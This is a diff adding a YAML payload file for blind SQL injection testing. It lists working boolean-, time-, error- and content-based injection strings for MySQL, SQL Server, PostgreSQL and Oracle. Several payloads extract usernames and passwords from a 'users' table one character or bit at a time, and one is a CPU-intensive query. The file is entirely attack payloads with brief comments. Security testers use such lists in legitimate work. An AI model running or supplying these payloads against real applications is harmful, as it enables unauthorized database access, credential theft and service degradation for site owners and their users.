@@ -1,0 +1,47 @@
+# Blind SQL Injection Payloads
+# ---------------------------
+# These payloads are designed for blind SQL injection testing
+# where you don't see direct query results but can infer them based on responses
+
+payloads:
+  # Boolean-based blind injection
+  - "' AND 1=1 --"           # True condition (page should load normally)
+  - "' AND 1=2 --"           # False condition (page may error or show differently)
+  - "' AND '1'='1 --"        # True condition 
+  - "' AND '1'='2 --"        # False condition
+  
+  # Content-based blind injection
+  - "' AND (SELECT 'a')='a' --"                     # True condition
+  - "' AND (SELECT 'a')='b' --"                     # False condition
+  - "' AND (SELECT 'test' FROM dual)='test' --"     # Oracle true condition
+  - "' AND (SELECT 'test' FROM dual)='fail' --"     # Oracle false condition
+  
+  # Database structure testing
+  - "' AND (SELECT COUNT(*) FROM users)>0 --"       # Test if 'users' table exists
+  - "' AND (SELECT COUNT(username) FROM users)>0 --" # Test if 'username' column exists
+  - "' AND (SELECT COUNT(*) FROM information_schema.tables)>0 --" # Test information_schema access
+  
+  # Time-based blind injection
+  # (These introduce a delay if condition is true)
+  - "' AND (SELECT SLEEP(5))=0 --"                  # MySQL 
+  - "' AND 1=IF(1=1,SLEEP(5),0) --"                 # MySQL conditional
+  - "'; WAITFOR DELAY '0:0:5' --"                   # SQL Server
+  - "'; IF 1=1 WAITFOR DELAY '0:0:5' --"            # SQL Server conditional
+  - "' AND 1=1; SELECT pg_sleep(5) --"              # PostgreSQL
+  - "' AND (SELECT 1 FROM PG_SLEEP(5))=1 --"        # PostgreSQL
+  - "' AND (SELECT count(*) FROM generate_series(1,5000000))>0 --" # PostgreSQL CPU intensive
+  - "' AND DBMS_PIPE.RECEIVE_MESSAGE('msg',5)=0 --" # Oracle
+  
+  # Error-based blind injection
+  - "' AND 1=CAST((SELECT user) as int) --"         # PostgreSQL error reveals user
+  - "' AND 1=CONVERT(int,(SELECT @@version)) --"    # SQL Server error reveals version
+  - "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e)) --" # MySQL error reveals version
+  
+  # Data extraction in blind scenarios
+  - "' AND ASCII(SUBSTRING((SELECT username FROM users LIMIT 1),1,1))=97 --"  # Test if first char is 'a'
+  - "' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a' --"        # Another approach
+  - "' AND (SELECT SUBSTR(username,1,1) FROM users WHERE rownum=1)='a' --"    # Oracle version
+  
+  # Bit by bit extraction
+  - "' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>70 --"  # Binary search approach
+  - "' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))&1=1 --" # Bit by bit 
